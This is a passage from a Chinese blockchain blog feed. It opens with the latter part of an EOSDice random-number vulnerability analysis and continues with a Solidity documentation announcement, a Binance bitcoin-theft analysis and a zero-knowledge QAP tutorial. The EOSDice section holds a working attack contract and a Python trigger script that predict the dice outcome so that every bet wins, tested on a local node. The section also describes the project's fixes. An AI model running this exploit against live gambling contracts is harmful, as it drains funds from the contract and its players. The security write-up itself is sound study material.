至此，EOSDice的随机数种子在下注前均可以获取，那就意味着我们可以在下注前预测到下注后的随机数，完全可以达到必中的效果。 攻击合约下面是我们测试攻击的合约，完成的功能是根据EOSDice的随机数算法来预测此次下注的随机数的值，然后选择roll的值比预测值大一即可中奖。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100#include &lt;utility&gt;#include &lt;vector&gt;#include &lt;string&gt;#include &lt;eosiolib/eosio.hpp&gt;#include &lt;eosiolib/time.hpp&gt;#include &lt;eosiolib/asset.hpp&gt;#include &lt;eosiolib/contract.hpp&gt;#include &lt;eosiolib/types.hpp&gt;#include &lt;eosiolib/transaction.hpp&gt;#include &lt;eosiolib/crypto.h&gt;#include &lt;boost/algorithm/string.hpp&gt;#include "eosio.token.hpp"using eosio::asset;using eosio::permission_level;using eosio::action;using eosio::print;using eosio::name;using eosio::unpack_action_data;using eosio::symbol_type;using eosio::transaction;using eosio::time_point_sec;class attack : public eosio::contract &#123; public: attack(account_name self):eosio::contract(self) &#123;&#125; uint8_t random(account_name name, uint64_t game_id, uint32_t prefix, uint32_t num) &#123; asset pool_eos = eosio::token(N(eosio.token)).get_balance(N(eosbocai2222), symbol_type(S(4, EOS)).name()); auto amount = pool_eos.amount + 10000; auto time = current_time() + 1000000; //auto mixd = tapos_block_prefix() * tapos_block_num() + name + game_id - current_time() + pool_eos.amount; auto mixd = prefix * num + name + game_id - time + amount; print( "[ATTACK RANDOM]tapos-prefix=&gt;", (uint32_t)prefix, "|tapos-num=&gt;", num, "|current_time=&gt;", time, "|game_id=&gt;", game_id, "|poll_amount=&gt;", amount, "\n" ); const char *mixedChar = reinterpret_cast&lt;const char *&gt;(&amp;mixd); checksum256 result; sha256((char *)mixedChar, sizeof(mixedChar), &amp;result); uint64_t random_num = *(uint64_t *)(&amp;result.hash[0]) + *(uint64_t *)(&amp;result.hash[8]) + *(uint64_t *)(&amp;result.hash[16]) + *(uint64_t *)(&amp;result.hash[24]); return (uint8_t)(random_num % 100 + 1); &#125; //@abi action void hi(uint64_t id, uint32_t block_prefix, uint32_t block_num) &#123; //uint8_t roll; uint8_t random_roll = random(N(attacker), id, block_prefix, block_num); print("[ATTACK]predict random num =&gt;", (int)random_roll,"\n"); if((int)random_roll &gt;2 &amp;&amp; (int)random_roll &lt;94) &#123; int roll = (int)random_roll + 1; auto dice_str = "dice-noneage-" + std::to_string(roll) + "-user"; print("[ATTACK]current_time=&gt;", current_time(), "\n"); print( "[ATTACK]tapos-prefix=&gt;", (uint32_t)tapos_block_prefix(), "|tapos-num=&gt;", tapos_block_num(), "\n" ); print("[ATTACK] before transfer"); action( permission_level&#123;_self, N(active)&#125;, N(eosio.token), N(transfer), std::make_tuple(_self, N(eosbocai2222), asset(10000, S(4, EOS)), dice_str) ).send(); &#125; &#125;&#125;;#define EOSIO_ABI_EX( TYPE, MEMBERS ) \extern "C" &#123; \ void apply( uint64_t receiver, uint64_t code, uint64_t action ) &#123; \ auto self = receiver; \ if( code == self || code == N(eosio.token)) &#123; \ if( action == N(transfer))&#123; \ eosio_assert( code == N(eosio.token), "Must transfer EOS"); \ &#125; \ TYPE thiscontract( self ); \ switch( action ) &#123; \ EOSIO_API( TYPE, MEMBERS ) \ &#125; \ /* does not allow destructor of thiscontract to run: eosio_exit(0); */ \ &#125; \ &#125; \&#125;EOSIO_ABI_EX( attack, (hi)) 攻击脚本下面，我们的测试攻击脚本，完成的功能是获取最新的块和块的id，计算出EOSDice开奖action的tapos_block_prefix和tapos_block_num，发送给上一个测试攻击的合约。 123456789101112131415161718192021222324import requestsimport jsonimport osimport binasciiimport structimport sysgame_id = sys.argv[1]# get tapos block numurl = "http://127.0.0.1:8888/v1/chain/get_info"response = requests.request("POST", url)res = json.loads(response.text)last_block_num = res["head_block_num"]# get tapos block idurl = "http://127.0.0.1:8888/v1/chain/get_block"data = &#123;"block_num_or_id":last_block_num&#125;response = requests.post(url, data=json.dumps(data))res = json.loads(response.text)last_block_hash = res["id"]# get tapos block prefixblock_prefix = struct.unpack("&lt;I", binascii.a2b_hex(last_block_hash)[8:12])[0]# attackcmd = '''cleos push action attacker hi '["%s","%s","%s"]' -p attacker@owner''' % (str(game_id), str(block_prefix), str(last_block_num))os.system(cmd) 攻击测试流程 创建相关账户并设置权限 123456# 创建EOSDICE相关账户和权限cleos create account eosio eosbocai2222 EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos set account permission eosbocai2222 active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"eosbocai2222","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p eosbocai2222# 创建攻击者相关账户机器权限cleos create account eosio attacker EOS6xKEsz5rXvss1otnB5kD1Fv9wRYLmJjQuBefRYaDY7jcfxtpVkcleos set account permission attacker active '&#123;"threshold": 1,"keys": [&#123;"key": "EOS6kSHM2DbVHBAZzPk7UjpeyesAGsQvoUKyPeMxYpv1ZieBgPQNi","weight": 1&#125;],"accounts":[&#123;"permission":&#123;"actor":"attacker","permission":"eosio.code"&#125;,"weight":1&#125;]&#125;' owner -p eosbocai1111 给相关账户发送代币 12cleos push action eosio.token issue '["attacker", "10000.0000 EOS", "memo"]' -p eosiocleos push action eosio.token issue '["eosbocai2222", "10000.0000 EOS", "memo"]' -p eosio 编译相关合约并部署 123456789101112# 编译攻击合约eosiocpp -o attack.wast attack.cppeosiocpp -g attack.abi attack.cpp# 部署攻击合约cleos set contract ~/attack -p attack@owner# 编译EOSDICE合约eosiocpp -o eosdice.wast eosbocai2222.cppeosiocpp -g eosdice.abi eosbocai2222.cpp# 部署EOSDICE合约cleos set code eosbocai2222 eosdice.wasm -p eosbocai2222@ownercleos set abi eosbocai2222 eosdice.abi -p eosbocai2222@owner 初始化EOSDice合约 1cleos push action eosbocai2222 init '[""]' -p eosbocai2222 最后，我们来测试一下，我们可以很容易的获取到下次投注的game_id，此次为109。 1python script.py 109 我们看一下合约的执行结果，可以看出，攻击合约预测的随机数和EOSDice的开奖action算出来的完全一致！这样就可以达到每次必中！ 官方漏洞修复方法漏洞修复很简单（也引起了后面再次被盗）： 开奖的action由一次defer action变成了两次defer action 漏洞修复代码在这个提交 。 根据前面我们提到的内容，defer action的ref block为发起defer action的前一个块。但是，在我们下注的时候这个块是无法预知的； 账户的余额用很多账户的总和加起来当成随机数种子 漏洞修复代码在这个提交 EOSDice的账户余额用了很多账户的余额的总和来当种子，这个貌似也是无法预测变化的。不过这样真的安全了吗？很明显，不是的，仅在漏洞修复6天后EOSDice再次受到随机数攻击，下篇文章会详细分析EOS DApp 随机数漏洞分析2 - EOSDice 随机数被操控。 推荐修复方法如何得到安全的随机数是一个普遍的难题，在区块链上尤其困难，因为区块链上无法获取外部随机源。 关于区块链随机数，推荐阅读区块链上的随机性（一）概述与构造 及 区块链上的构建随机性的项目分析 要在区块链上选择一个无法被提前预知种子确实困难。零时科技安全专家推荐参考 EOS 官方的随机数生成方法来生成较为安全的随机数。 文章用到的所有代码均在github， 本文所有过程均在本地测试节点完成。 参考链接 EOS上如何安全生成随机数 EOSDIEC 随机数被攻破 eos 文档 eosdice 合约源码 eos 文档-生成随机数 本文由深入浅出区块链社区合作伙伴-零时科技安全团队提供。 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>随机数</tag>
        <tag>EOS DApp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Solidity 最新 0.5.8 中文文档发布]]></title>
    <url>%2F2019%2F05%2F08%2Fsolidity-doc-announce%2F</url>
    <content type="text"><![CDATA[热烈祝贺 Solidity 最新 0.5.8 中文文档发布， 这不单是一份 Solidity 速查手册，更是一份深入以太坊智能合约开发宝典。 翻译说明Solidity 最新 0.5.8 中文文档 根据当前 最新官方版本v0.5.8 进行翻译，本翻译最初 HiBlock 社区发起，后经过 深入浅出区块链社区 社区成员根据最新版本补充翻译。 大部分的译者，都是国内顶尖的以太坊开发和研究人员，部分译者如下： 杨镇 《深入以太坊智能合约开发》作者，《精通以太坊》译者 姜信宝 HiBlock 区块链社区发起人 ， Tiny熊 《精通以太坊智能合约开发》作者，深入浅出区块链技术博客发起人 盖方宇 哥伦比亚大学电子工程系博士，专注扩容研究 虞是乎 磨链发起人 左洪斌《Scrum精髓(敏捷转型指南)》译者 感谢所有的译者贡献，献花~ 献花~ 这份文档无疑是最新质量最好的中文文档，本文仅仅是部分摘要和目录， 完整文档请前往 https://learnblockchain.cn/docs/solidity/ 。 翻译工作是一个持续的过程（这份文档目前也还有部分未完成），我们热情邀请热爱区块链技术的小伙伴一起参与，欢迎加入我们Group： https://github.com/lbc-team 。 本中文文档大部分情况下，英中直译，但有时为了更好的理解也会使用意译，如需转载请联系Tiny熊（微信：xlbxiong）. Solidity 语言简介 及 文档目录Solidity 是一门面向合约的、为实现智能合约而创建的高级编程语言。这门语言受到了 C++，Python 和 Javascript 语言的影响，设计的目的是能在以太坊虚拟机（EVM）]上运行。 要理解智能合约及虚拟机是怎么运行，推荐这两篇非常好的文章 完全理解以太坊智能合约 及 深入浅出以太坊虚拟机 Solidity 是静态类型语言，支持继承、库和复杂的用户定义类型等特性， 以下是完整目录。 文档目录 入门智能合约 简单的智能合约 存储合约（把一个数据保存到链上） 子货币合约（Subcurrency）示例 区块链基础 交易/事务 区块 以太坊虚拟机 概述 账户 交易 Gas 存储，内存和栈 指令集 消息调用 委托调用/代码调用和库 日志 合约创建 失效和自毁 安装Solidity编译器 版本 Remix npm / Node.js Docker 二进制包 从源代码编译 克隆代码库 先决条件 - macOS 先决条件 - Windows 外部依赖 命令行构建 CMake参数 SMT Solvers 版本号字符串详解 版本信息详情 根据例子学习Solidity 投票合约 可能的优化 秘密竞价（盲拍）合约 简单的公开拍卖 秘密竞拍（盲拍） 安全的远程购买合约 微支付通道合约 创建及验证签名 创建签名 哪些内容需要签名 打包参数 在Solidity中还原消息签名者 提取签名参数 计算信息的Hash ReceiverPays 完整合约代码 编写一个简单的支付通道 什么是支付通道？ 打开支付通道 进行支付 关闭状态通道 通道有效期 完整合约代码 验证支付 库合约使用 深入理解Solidity Solidity 源文件结构 Pragmas 版本标识 标注实验性功能 导入其他源文件 语法与语义 路径 在实际的编译器中使用 注释 合约结构 状态变量 函数 函数 修饰器modifier 事件 Event 结构体 枚举类型 类型 值类型 布尔类型 整型 定长浮点型 地址类型 Address 合约类型 定长字节数组 变长字节数组 地址字面常量 有理数和整数字面常量 字符串字面常量及类型 十六进制字面常量 枚举类型 函数类型 引用类型 数据位置 数组 结构体 映射 涉及 LValues 的运算符 delete 基本类型之间的转换 隐式转换 显式转换 字面常量与基本类型的转换 整型 定长字节数组 地址类型 类型推断(已弃用) 单位和全局变量 以太币Ether 单位 时间单位 特殊变量和函数 区块和交易属性 ABI 编码函数 错误处理 数学和密码学函数 地址相关 合约相关 类型信息 表达式和控制结构 输入参数和输出参数 输入参数 输出参数 控制结构 函数调用 内部函数调用 外部函数调用 具名调用和匿名函数参数 省略函数参数名称 通过 new 创建合约 赋值 解构赋值和返回多值 数组和结构体的复杂性 作用域和声明 错误处理：Assert, Require, Revert and Exceptions 合约 创建合约 可见性和 getter 函数 Getter 函数 函数 修饰器modifier Constant 状态变量 函数 函数参数及返回值 View 函数 Pure 函数 Fallback 回退函数 函数重载 事件 日志的底层接口 其它学习事件机制的资源 继承 构造器 基类构造函数的参数 多重继承与线性化 继承有相同名字的不同类型成员 抽象合约 接口 库 库的调用保护 Using For Solidity汇编 内联汇编 例子 语法 操作码 字面常量 函数风格 访问外部变量和函数 标签 汇编局部变量声明 赋值 If Switch 循环 函数 注意事项 Solidity 惯例 独立汇编 汇编语法 杂项 存储storage 中的状态变量储存结构 内存memory 中的存储结构 调用数据存储结构 内部机制 - 清理变量 内部机制 - 优化器 源代码映射 技巧和窍门 速查表 操作符优先级 全局变量 函数可见性说明符 修改器 保留字 语法表 Solidity v0.5.0 重大更新 语义变化 语义及语法更改 准确性要求 弃用元素 弃用命令行及 JSON 接口 构造函数变更 弃用函数 弃用类型转换 弃用字面量及后缀 弃用变量 弃用语法 和老合约进行交互 举例 注释描述规范 文档举例 标签 Dynamic expressions Inheritance Notes 文档输出 用户文档 开发者文档 安全考量 陷阱 私有信息和随机性 重入 gas 限制和循环 发送和接收 以太币Ether 调用栈深度 tx.origin问题 整型溢出问题 细枝末节 推荐做法 认真对待警告 限定 以太币Ether 的数量 保持合约简练且模块化 使用“检查-生效-交互”（Checks-Effects-Interactions）模式 包含故障-安全（Fail-Safe）模式 形式化验证 资源 常用资源 Solidity IDE及编辑器 Solidity 工具 第三方 Solidity 解析器 使用编译器 使用命令行编译器 编译器输入输出JSON描述 输入说明 输出说明 错误类型 合约的元数据 元数据哈希字节码的编码 自动化接口生成和 以太坊标准说明格式natspec 的使用方法 源代码验证的使用方法 应用二进制接口Application Binary Interface(ABI) 说明 基本设计 函数选择器Function Selector 参数编码 类型 编码的形式化说明 函数选择器Function Selector 和参数编码 例子 动态类型的使用 事件 JSON 处理 元组tuple 类型 非标准打包模式 Yul Yul 语言说明 语法层面的限制 作用域规则 形式规范 类型转换函数 低级函数 后端 后端: EVM 后端: “EVM 1.5” 后端: eWASM Yul 对象说明 编程风格指南 概述 代码结构 缩进 制表符或空格 空行 代码行的最大长度 源文件编码格式 Imports 规范 函数顺序 表达式中的空格 控制结构 函数声明 映射 变量声明 其他建议 命名规范 命名方式 应避免的名称 合约和库名称 结构体名称 事件名称 函数名称 函数参数命名 局部变量和状态变量名称 常量命名 修饰符命名 枚举变量命名 避免命名冲突 描述注释 NatSpec 通用模式 从合约中提款 限制访问 状态机 示例 已知bug列表 贡献方式 怎样报告问题 Pull Request 的工作流 运行编译器测试 编写和运行语法测试 通过 AFL 运行 Fuzzer Whiskers 模板系统 LLL 常见问题 基本问题 高级问题 怎样才能在合约中获取一个随机数？（实施一份自动回款的博彩合约） 从另一份合约中的 non-constant 函数获取返回值 让合约在首次被挖出时就开始做些事情 怎样才能创建二维数组？ 深入浅出区块链 - 系统学习区块链，学区块链都在这里，打造最好的区块链技术博客。]]></content>
      <categories>
        <category>以太坊</category>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Solidity</tag>
        <tag>文档</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[币安交易所比特币被窃漏洞分析]]></title>
    <url>%2F2019%2F05%2F08%2Fbinance-btc-security%2F</url>
    <content type="text"><![CDATA[知名加密货币交易所币安受到黑客攻击，目前已经有7074.18个比特币被窃。 发生了什么根据币安首席执行官赵长鹏对外披露的信息，该交易所在5月7日发现了大规模的安全漏洞，该漏洞导致黑客能够访问用户应用程序接口密钥（API keys）、双重身份验证码、以及其他信息。按照安全通知中公布的一笔交易，黑客从币安交易所中取走了价值大约4100万美元的比特币。 被窃交易详情对此次攻击，Beosin成都链安科技安全团队进行了深度分析： 交易详情如下： 交易发生在575013块，总损失最高可达7074个BTC 详细提币地址 截至目前，币安热钱包（地址：1NDyJtNTjmwk5xPNhjgAMu4HDHigtobu1s）被盗约7000枚BTC.现在币安的热钱包余额3,612.69114593个BTC，说明币安热钱包的私钥安全。 经过团队分析，黑客在05月08日 01:17:18 通过API接口在同一时间发起提币操作。 币安交易所 API 功能币安交易所的API申请后会生成API key和Secret key，如下图： API接口有限定用户开放IP限制和开放提现功能。 开放提现就是直接利用API key和Secret key直接提现，不需要收集验证码、短信、谷歌验证码。如下图： API部分官方调用代码demo如下（来自）: 123456789101112131415161718192021222324252627282930from binance.client import Clientclient = Client(api_key, api_secret)# get market depthdepth = client.get_order_book(symbol='BNBBTC')# place a test market buy order, to place an actual order use the create_order functionorder = client.create_test_order( symbol='BNBBTC', side=Client.SIDE_BUY, type=Client.ORDER_TYPE_MARKET, quantity=100)# get all symbol pricesprices = client.get_all_tickers()# withdraw 100 ETH# check docs for assumptions around withdrawalsfrom binance.exceptions import BinanceAPIException, BinanceWithdrawExceptiontry: result = client.withdraw( asset='ETH', address='&lt;eth_address&gt;', amount=100)except BinanceAPIException as e: print(e)except BinanceWithdrawException as e: print(e)else: print("Success") 安全分析初步分析认为是用户的API key和Secret key信息泄露导致的此次攻击。 如果用户没有限制ip并配置了开放提现功能，任意攻击者在获取了API key和Secret key信息后便可以实现攻击。 用户的信息泄露途径可能有： 普通用户一般不会使用api key，一般是高级用户用于代码中实现自动化交易，可能是用户源码泄露导致api Secret key泄露 用户被钓鱼攻击，输入了API key和Secret key被黑客截取。 用户的API key和Secret key保存的电脑被攻击窃取。 币安交易所系统原因导致用户API key和Secret key泄露，其中只有71个用户开放了提现功能，被盗币。 被黑客盗取的7074枚BTC的主要20个地址如下： 1234567891011121314151617181920bc1qp6k6tux6g3gr3sxw94g9tx4l0cjtu2pt65r6xp 555.997 BTCbc1qqp8pwq277d30cy7fjpvhcvhgztvs7v0nudgul5 463.9975 BTCbc1qld27dqu6wrl4tmjdr8tl55qavmghwrr4ldh7qn 473.9975 BTCbc1q8m9h3atn4cqeqhu3ekswdqxchp3g7d4v3qv3wm 567.997 BTCbc1q7p6edvd4zvtya8uj366c23dan8pvlp503spucu 468.9975 BTCbc1ql0wlnu80l8kctjzkzlzd72sdjqwuvruvgepceq 383.998 BTCbc1q3ldtrr6xtpx8jam5gw68aaexz2wtluj0qullvr 189.999 BTCbc1qyv4zv0wjn299kx4yz6g7v6g6400wqgzcqgw9vx 383.998 BTCbc1q6fejm4r866tmt8ptf42juedv5gevlv2qt72agq 371.998 BTCbc1qvstwzsrfml43jrclsp68220l4lx5lw3kwf7dp0 193.999 BTCbc1qecs672j9dpvwr56zeldgf3swtlv3dad52wzuta 463.9975 BTCbc1qshkncv7tkpye7z0z4a3k9yw2e73whha9gjs88z 97.9995 BTCbc1qhlhx6lrnr0jf4zpvm788j7yeezau6s8q557p2z 279.9985 BTCbc1qesy52g7ndy652qudr2awuk57mcaxgmn9qsmpzk 469.9975 BTCbc1q9svj9wp68zftgejjgk6f96ukuyx8c5urkqsv69 193.999 BTCbc1qanrl8n3flz4jftkscljx2hwuc3h50f9ynp2nyn 89.9995 BTCbc1qtpdptcf4ngfkwq6dr36kqaeh2n5h00rx5unkgc 670.9965 BTCbc1qvr2jxlmvckap7cg2l6mdgh5fa8glkhe4s88sax 377.998 BTCbc1qhqap39mpkldjzvqdf3204p732krtnf56mm9aj3 370.998 BTC3KBsR6Ld255Tw5hNR4S6KaX5SXxvRF6jv3 1.29968018 BTC 安全无小事各交易所和用户都应该注意信息的保护，用户在使用开放提现等高级功能时，应提高对安全性的重视，避免信息泄露导致的各种危害，不让攻击者有可乘之机。 本文来自 深入浅出区块链社区合作伙伴：专注于区块链生态安全的Beosin 成都链安 深入浅出区块链 - 打造高质量区块链技术博客，学区块链都来这里，关注知乎、微博。]]></content>
      <categories>
        <category>区块链安全</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[零知识证明 - 从QSP到QAP]]></title>
    <url>%2F2019%2F05%2F07%2Fqsp-qap%2F</url>
    <content type="text"><![CDATA[前一段时间，介绍了零知识证明的入门知识，通过QSP问题证明来验证另外一个NP问题的解。最近在看QAP问题相关的文章和资料，这篇文章分享一下QAP问题的理解。 背景介绍QSP/QAP问题的思想都是出自2012年一篇论文：Quadratic Span Programs and Succinct NIZKs without PCPs。论文的下载地址：https://eprint.iacr.org/2012/215.pdf。 这篇论文提出了使用QSP/QAP问题，而不使用PCP方式，实现零知识证明。 术语介绍 SP - Span Program ，采用多项式形式实现计算的验证。 QSP - Quadratic Span Program，QSP问题，实现基于布尔电路的NP问题的证明和验证。 QAP - Quadratic Arithmetic Program，QAP问题，实现基于算术电路的NP问题的证明和验证，相对于QSP，QAP有更好的普适性。 PCP - Probabilistically Checkable Proof ，在QSP和QAP理论之前，学术界主要通过PCP理论实现计算验证。PCP是一种基于交互的，随机抽查的计算验证系统。 NIZK - Non-Interactive Zero-Knowledge，统称，无交互零知识验证系统。NIZK需要满足三个条件：1/ 完备性(Completeness)，对于正确的解，肯定存在相应证明。 2/可靠性 (Soundness) ，对于错误的解，能通过验证的概率极低。3/ 零知识。 SNARG - Succinct Non-interactive ARGuments，简洁的无须交互的证明过程。 SNARK - Succinct Non-interactive ARgumentss of Knowledge，相比SNARG，SNARK多了Knowledge，也就是说，SNARK不光能证明计算过程，还能确认证明者“拥有”计算需要的Knowledge（只要证明者能给出证明就证明证明者拥有相应的解）。 zkSNARK - zero-knowledge SNARK，在SNARK的基础上，证明和验证双方除了能验证计算外，验证者对其他信息一无所知。 Statement - 对于QSP/QAP，和电路结构本身（计算函数）相关的参数。比如说，某个计算电路的输入/输出以及电路内部门信息。Statement对证明者和验证者都是公开的。 Witness - Witness只有证明者知道。可以理解成，某个计算电路的正确的解（输入）。 QAP问题的定义QAP的定义和QSP的定义有些相似（毕竟都是一个思想理论的两种形式）。论文中给出了QAP的一般定义和强定义。QAP的强定义如下： QAP问题是这样一个NP问题：给定一系列的多项式，以及给定一个目标多项式，找出多项式的组合能整除目标多项式。输入为n位的QAP问题定义如下： 给定多个多项式：$v_0, … , v_m, w_0, … , w_m, y_0, … , y_m$ 目标多项式：$t$ 映射函数：$$ f: \left{(i, j) |1\leq i \leq n, j\in{0,1} \right} \to \left{1, … m\right}$$ 给定一个证据（Witness）u，满足如下条件，即可验证u是QAP问题的解： $$a_k, b_k, c_k = 1\ \ 如果 k = f(i, u[i])$$ $$a_k, b_k, c_k = 0\ \ 如果 k = f(i, 1- u[i])$$ $$(v_0(x) + \sum_{k=1}^m a_k \cdot v_k(x)) \cdot (w_0(x) + \sum_{k=1}^m b_k \cdot w_k(x)) - (y_0(x) + \sum_{k=1}^m c_k \cdot y_k(x)) 能整除 t(x)$$ 对一个证据u，对每一位进行两次映射计算（$u[i]$以及$1-u[i]$），确定多项式之间的系数（$a_1, …, a_m, 和b_1, … , b_m, 以及 c_1, …, c_m$ 相等）。 算术电路算术电路可以简单看成由如下的三种门组成：加门，系数乘法门以及通用乘法门（减法可以转化为加法，除法可以转化为乘法）。Vitalik在2016年写过的QAP介绍，深入浅出的解释NP问题的算术电路生成和QAP问题的转化，推荐大家都读一读。 以Vitalik文章中的例子为例，算术逻辑（$x^3 + x + 5$）对应的电路如下图所示： QAP问题的转化把一个算术电路转化为QAP问题的过程，其实就是将电路中的每个门描述限定的过程，也就是所谓的R1CS （Rank-1 constraint system）。 算术电路拍平算术电路拍平，就是用一组向量定义算术电路中的所有的变量（包括一个常量变量）。比如2中所示的电路，拍平之后的向量表示为$[one, x, out, sym_1, y, sym_2 ]$，其中one代表常量变量，x代表输入，out代表输出，其他是中间门电路的输出。 假设一个合理的电路向量值为$s - [s_0, s_1, s_2, s_3, s_4, s_5]$。 门描述对于每个电路中的门进行描述，说清输入以及输出，采用$$s \cdot a* s \cdot b - s \cdot c = 0$$的形式，其中$a,b,c$都是和电路向量长度一致的向量值。$s \cdot a, s \cdot b, s \cdot c$都是点乘。这种形式表达的是“乘法门”。可以简单的理解，$a, b, c和s$的点乘就是“挑选”向量中的变量，查看挑选出的变量是否满足$A * B = C$。 各个门对应的$a, b, c$的向量值如下： 门1 (查看$x * x 是否等于 sym_1$）： $a = [0, 1, 0, 0, 0, 0]​$ $b = [0, 1, 0, 0, 0, 0]$ $c = [0, 0, 0, 1, 0, 0]$ 门2 (查看$sym_1 * x 是否等于 y$）： $a = [0, 0, 0, 1, 0, 0]$ $b = [0, 1, 0, 0, 0, 0]$ $c = [0, 0, 0, 0, 1, 0]$ 门3 (查看$(x + y)*1 是否等于 sym_2$）： $a = [0, 1, 0, 0, 1, 0]$ $b = [1, 0, 0, 0, 0, 0]$ $c = [0, 0, 0, 0, 0, 1]$ 门4 (查看$(5x + sym_2) * 1 是否等于out$）： $a = [5, 0, 0, 0, 0, 1]$ $b = [1, 0, 0, 0, 0, 0]$ $c = [0, 0, 1, 0, 0, 0]$ 多项式表达在门电路描述的基础上，将所有的门电路，转化为多项式表达。将$a, b, c$中的每个系数，看成一个多项式的结果（以a为例）：$a = [f_0(x), f_1(x), f_2(x), f_3(x), f_4(x), f_5(x)]$。 针对门1/门2/门3/门4，$f_0(x), f_1(x), f_2(x), f_3(x), f_4(x), f_5(x)$的取值不同。比如说：门1的a的$f_0(x)$为0，门2的a的$f_0(x)$为0，门3的a的$f_0(x)$为0，门4的a的$f_0(x)$为5。 设定门1对应的x为1，门2对应的x为2，门3对应的x为3，门4对应的x为4的话（这些值可以任意指定），会得到如下的等式： $f_0(1) = 0, f_0(2) = 0, f_0(3)=0, f_0(4)=5$ 在获知一系列的输入和输出的前提下，可以通过拉格朗日定理，获取多项式表达式。小伙伴可以通过这个工具计算多项式。 也就是说，a的$f_0(x) = -5 + 9.167x + -5x^2 + 0.833x^3$。同样的方式，可以算其他参数的$f_0(x), f_1(x), f_2(x), f_3(x), f_4(x), f_5(x)$。再把这些多项式代入$$s \cdot a* s \cdot b - s \cdot c = 0$$，在正确的$s$向量值的情况下，1/2/3/4能让等式成立，也就是说，多项式$s \cdot a* s \cdot b - s \cdot c$能整除$(x-1)(x-2)(x-3)(x-4)$。这样，一个算术电路就转化为了QAP问题。 QAP问题的zkSNARK证明QAP问题的zkSNARK证明过程和QSP有点类似。skSNARK证明过程分为两部分：a) setup阶段 b）证明阶段。QAP问题就是给定一系列的多项式$v_0, …, v_m, w_0, …, w_m, y_0, … , y_m$以及目标多项式$t$，证明存在一个证据$u$。这些多项式中的最高阶为$d$。 setup和CRSCRS - Common Reference String，也就是预先setup的公开信息。在选定$s$和$\alpha$的情况下，发布如下信息： $s$和$\alpha$的计算结果 $$E(s^0), E(s^1), … , E(s^d)$$ $$E(\alpha s^0), E(\alpha s^1), … , E(\alpha s^d)$$ 多项式的$\alpha$对的计算结果$$E(t(s)), E(\alpha t(s))$$ $$E(v_0(s)), … E(v_m(s)), E(\alpha v_0(s)), …, E(\alpha v_m(s))$$ $$E(w_0(s)), … E(w_m(s)), E(\alpha w_0(s)), …, E(\alpha w_m(s))$$ $$E(y_0(s)), … E(y_m(s)), E(\alpha y_0(s)), …, E(\alpha y_m(s))$$ 多项式的$\beta_v, \beta_w, \beta_y, \gamma$ 参数的计算结果 $$E(\gamma), E(\beta_v\gamma), E(\beta_w\gamma), E(\beta_y\gamma)$$ $$E(\beta_vv_1(s)), … , E(\beta_vv_m(s))$$ $$E(\beta_ww_1(s)), … , E(\beta_ww_m(s))$$ $$E(\beta_yy_1(s)), … , E(\beta_yy_m(s))$$ $$E(\beta_vt(s)), E(\beta_wt(s)), E(\beta_yt(s))$$ 证明者提供证据在QAP的映射函数中，如果$2n &lt; m$，$1, …, m$中有些数字没有映射到。这些没有映射到的数字组成$I_{free}$，并定义（$k$为未映射到的数字）： $$v_{free}(x) = \sum_k a_kv_k(x)$$ 证明者需提供的证据如下： $$V_{free} := E(v_{free}(s)), \ W := E(w(s)), \ Y := E(y(s)), \ H := E(h(s)),$$ $$V_{free}’ := E(\alpha v_{free}(s)), W’ := E(\alpha w(s)), Y’ := E(\alpha y(s)), H’ := E(\alpha h(s)), $$ $$P := E(\beta_vv_{free}(s) + \beta_ww(s) + \beta_yy(s))$$ $$V_{free}/V_{free}’, W/W’, Y/Y’, H/H’ 是 \alpha 对，用以验证v_{free},w,y,h 是否是多项式形式。 $$$$ t 是已知，公开的，毋需验证， P 用来确保 v_{free}(s), w(s) 和 y(s)的计算采用一致的参数。$$ 验证者验证在QAP的映射函数中，如果$2n &lt; m$，$1, …, m$中所有映射到的数字作为组成系数组成的二项式定义为（和$v_{free}$互补）： $$v_{in}(x) = \sum_k a_kv_k(x)$$ 验证者需要验证如下的等式是否成立： $$e(V_{free}’, g) = e(V_{free}, g^\alpha), e(W’, E(1)) = e(W, E(\alpha)), e(Y’, E(1)) = e(Y, E(\alpha)), e(H’, E(1)) = e(H, E(\alpha))$$ $$e(E(\gamma), P) = e(E(\beta_v\gamma), V_{free})e(E(\beta_w\gamma), W)e(E(\beta_y\gamma), Y)$$ $$e(E(v_0(s))E(v_{in}(s))V_{free}, E(w_0(s))W) = e(H, E(t(s)))e(y_0(s)Y, E(1))$$ 第一个（系列）等式验证$$V_{free}/V’_{free}, W/W’, Y/Y’, H/H’是否是\alpha对$$。 第二个等式验证$$V_{free}, W, Y$$的计算采用一致的参数。因为$v_{free}, w, y$都是二项式，它们的和也同样是一个多项式，所以采用$\gamma$ 参数进行确认。证明过程如下： $$e(E(\gamma), P) = e(E(\gamma), E(\beta_vv_{free}(s) + \beta_ww(s) + \beta_yy(s))) = e(g, g)^{\gamma(\beta_vv_{free}(s) + \beta_ww(s) + \beta_yy(s))}$$ $$e(E(\beta_v\gamma), V_{free})e(E(\beta_w\gamma), W)e(E(\beta_y\gamma), Y) = e(E(\beta_v\gamma), E(v_{free}(s)))e(E(\beta_w\gamma), E(w(s)))e(E(\beta_y\gamma), E(y(s)))$$ $$= e(g,g)^{(\beta_v\gamma)v_{free}(s)}e(g,g)^{(\beta_w\gamma)w(s)}e(g,g)^{(\beta_y\gamma)y(s)}= e(g, g)^{\gamma(\beta_vv_{free}(s) + \beta_ww(s) + \beta_yy(s))}$$ 第三个等式验证$$v(s)w(s) - y(s) = h(s)t(s)$，其中$v_0(s)+v_{in}(s)+v_{free}(s) = v(s)$$。 简单的说，逻辑是确认$v, w, y, h$是多项式，并且$v,w,y$采用同样的参数，满足$v(s)w(s)- y(s)= h(s)t(s)$。 